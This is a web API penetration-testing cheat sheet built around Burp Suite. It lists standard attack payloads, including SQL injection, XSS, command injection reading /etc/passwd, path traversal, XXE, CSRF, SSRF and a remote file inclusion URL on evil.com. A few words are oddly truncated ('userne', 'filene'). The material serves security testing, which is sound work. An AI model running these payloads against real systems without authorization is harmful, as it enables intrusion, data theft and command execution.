```
Add parameters
Something like the following example might get you access to another user’s photo album:
/api/MyPictureList → /api/MyPictureList?user_id=<other_user_id>

.json
?
..;/
\..\.\getUSer
/
??
&details
#
%
%20
%09


Replace parameters
You can try to fuzz parameters or use parameters you have seen in a different endpoints to try to access other information


Wildcard parameter
Try to use the following symbols as wildcards: *, %, _, .
/api/users/*
/api/users/%
/api/users/_
/api/users/.



Parameter pollution
/api/account?id=<your account id> → /api/account?id=<your account id>&id=<admin's account id>
/api/get_profile?user_id=<victim’s_id>&user_id=<user_id>

HTTP request method change
You can try to use the HTTP methods: GET, POST, PUT, DELETE, PATCH, INVENTED to try check if the web server gives you unexpected information with them.

Request content-type

Try to play between the following content-types (bodifying acordinly the request body) to make the web server behave unexpectedly:

x-www-form-urlencoded --> user=test
application/xml --> <user>test</user>

    application/json --> {"user": "test"}

Parameters types
If JSON data is working try so send unexpected data types like:
{"userne": "John"}
{"userne": true}
{"userne": null}
{"userne": 1}
{"userne": [true]}
{"userne": ["John", true]}
{"userne": {"$neq": "lalala"}}

    any other combination you may imagine


Play with routes
/files/..%2f..%2f + victim ID + %2f + victim filene
Check possible versions

Old versions may be still be in use and be more vulnerable than latest endpoints
/api/v1/login
/api/v2/login\
/api/CharityEventFeb2020/user/pp/<ID>

    /api/CharityEventFeb2021/user/pp/<ID>

    SQL Injection
    Test for SQL injection vulnerabilities by injecting SQL code into API inputs to see if the database executes them. This can lead to unauthorized data exposure or manipulation.
        In Burp, use the Repeater tool to send requests with SQL injection payloads in parameters where user input is accepted.
        Analyze the responses for any signs of SQL error messages or unintended data exposure.

    ' OR '1'='1
    ' UNION SELECT userne, password FROM users --


    Cross-Site Scripting (XSS)
    Identify XSS vulnerabilities by injecting scripts into API inputs to see if they are executed by the browser. This can compromise user sessions or redirect users to malicious sites.
        Use Burp's Intruder with XSS payloads targeting API parameters that reflect input back in responses.
        Check responses in Burp's response viewer for evidence of unescaped script execution.

'><img src=x onerror=alert('XSS')>

"><script>alert('XSS')</script>


    Command Injection
    Check for command injection flaws by supplying OS commands in API calls. If the backend system executes these commands, it indicates a severe security flaw.
        Send modified requests through Burp's Repeater with command injection payloads in API parameters.
        Look for unexpected or unauthorized command outputs in the API's response.

    ; ls -la
    && cat /etc/passwd


    File Inclusion
    Test for Local File Inclusion (LFI) or Remote File Inclusion (RFI) vulnerabilities by attempting to include files or URLs in API requests. Successful exploitation could lead to code execution or data leakage.
        Manipulate API requests in Burp's Repeater to include local or remote file paths in parameters that accept filenes or URLs.
        Observe responses for evidence of file content or remote code execution.
  
  ../../etc/passwd

    http://evil.com/malicious.php



    Broken Authentication
    Probe for broken authentication by manipulating authentication tokens or session IDs to escalate privileges or assume the identity of another user.
        Use Burp's Sequencer to analyze the entropy of session tokens or cookies issued by the API.
        Attempt to manipulate session cookies or tokens in Repeater to access protected API endpoints without proper authentication.

    Manipulate the Authorization header to use another user's token or session ID.
    Alter cookie values to test session management flaws.



    Insecure Direct Object References (IDOR)
    Test for IDOR by changing resource identifiers (like user IDs) in API requests to access data belonging to other users without authorization.
        Manually modify the resource identifiers in API requests using Burp's Repeater to try accessing other users' data.
        Check the responses for unauthorized data disclosure.

Change an ID in the URL or body from userid=123 to another user's ID like userid=456.
Accessing endpoints directly that should require user role validation, e.g., /api/admin/data


    Security Misconfiguration
    Explore security misconfigurations by checking for unnecessary HTTP methods enabled or improperly secured endpoints that expose sensitive data.
        Use Burp's Scanner to automatically test for misconfigured HTTP methods on API endpoints.
        Manually test using Repeater by sending requests with different HTTP methods (e.g., PUT, DELETE) to API endpoints that shouldn't allow them.

    Use OPTIONS HTTP method to find enabled methods on a URL.
    Access .git or .env files, e.g., /api/.env.



    Sensitive Data Exposure
    Investigate sensitive data exposure by checking API responses for sensitive information (like passwords, tokens) that isn't properly protected.
        Inspect API responses in Burp for exposed sensitive data that should be encrypted or redacted.

        Use Burp's search function to scan through responses for patterns that match sensitive data formats.

    Look for API responses that include creditCardNumber or password in clear text.
    Test endpoints for lack of SSL/TLS, potentially exposing data in transit.


    XML External Entity (XXE) Injection
    Test for XXE vulnerabilities by injecting XML documents that reference external entities into API inputs, potentially allowing file disclosure or server-side request forgery (SSRF).
        Inject XXE payloads into XML-based API requests using Burp's Repeater and check for interactions with external entities.
        Monitor responses for data leakage or evidence of external entity processing.

    <!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
  
	Send XML data that includes an external entity reference to fetch file contents or perform SSRF.


    Cross-Site Request Forgery (CSRF)
    Examine CSRF vulnerabilities where an attacker might trick a user into executing unwanted actions on a web application in which they're authenticated.
        Use Burp's Repeater to craft GET or POST requests that mimic a legitimate action of an authenticated user without requiring a CSRF token.
        Check if the API processes the request without validating the presence or correctness of a CSRF token.

    Create a malicious webpage that sends a request to the API like <img src="http://api.site.com/task/delete/1" />.
    Use forms in HTML pages that submit requests to the API without the user's consent or knowledge.


    API Path Traversal
    Test for path traversal issues by manipulating file paths in API requests to access files or directories outside of the intended paths.
        Use Burp's Repeater to modify API requests by inserting "../" sequences in file path parameters aiming to traverse the directory tree.
        Evaluate the responses for unauthorized file or directory access.

../etc/passwd
..%2F..%2F..%2Fetc%2Fpasswd (URL encode


    Improper Assets Management
    Assess improper asset management by attempting to access undocumented or obsolete API endpoints that may not be properly secured.
        Use Burp's content discovery tool to uncover hidden or forgotten API endpoints.
        Test these endpoints with Repeater for vulnerabilities, as they might be less secure or not maintained.

    Accessing deprecated API versions, e.g., /api/v1/users when the current version is /api/v3/users.
   
 Trying to access endpoints that are not listed in the official documentation but can be guessed or discovered.


    Insecure Deserialization
    Look for insecure deserialization issues by altering serialized objects sent to the API to execute arbitrary code or manipulate application logic.
       
 Send modified serialized objects in API requests through Burp's Repeater, trying to induce application errors or unexpected behaviors.
        Monitor the API's responses for indications of deserialization errors or code execution.

    Modify serialized object strings in requests, e.g., changing serialized Java objects or JSON tokens that include class references or execution commands.
 
   Injecting malicious code or objects into serialized data formats, expecting the server to deserialize it unsafely.



Server-Side Request Forgery (SSRF)

Probe for SSRF by crafting API requests that cause the server to make unintended network calls to internal or external resources. This can lead to sensitive data leaks or internal system access.
- Utilize Burp's Repeater to change API parameters to URLs or IP addresses pointing to internal services or files.
- Check for server responses that suggest the internal request was made, indicating SSRF vulnerability.

    Changing URL parameters to internal resources, e.g., url=http://localhost/admin.

    Using the file:// or dict:// schemes to access internal files or services.


    Rate Limiting and Anti-Automation
    Test for insufficient rate limiting or anti-automation controls by making repeated API calls in a short period. This could allow brute-force attacks or denial-of-service (DoS) conditions.
        Use Burp's Intruder with a payload of repeated requests to the same API endpoint to test if the application enforces rate limiting.
        Analyze the responses for HTTP status codes indicating throttling (429 Too Many Requests) or application errors that reveal lack of rate limiting.

For each of these tests in Burp Suite:

    Start by setting up your target application in Burp's Proxy "Target" tab to intercept the requests.
    Depending on the test, use the "Repeater" to manually adjust and resend requests, the "Intruder" for automated attacks with multiple payloads, or the "Scanner" for automated vulnerability scanning.
    Always analyze the responses in the "Response" tab or the "Logger" to observe the effects of your payloads and identify potential vulnerabilities.
    For tests requiring specific techniques like token manipulation or header adjustments, modify the request headers or parameters directly in the "Repeater" tab.
Tailor them to the context of your target API, considering how parameters are passed (e.g., JSON, XML, form data).
Always encode payloads appropriately for the context in which they're being injected, such as URL encoding for parameters in GET requests or HTML encoding for content reflected in web pages.



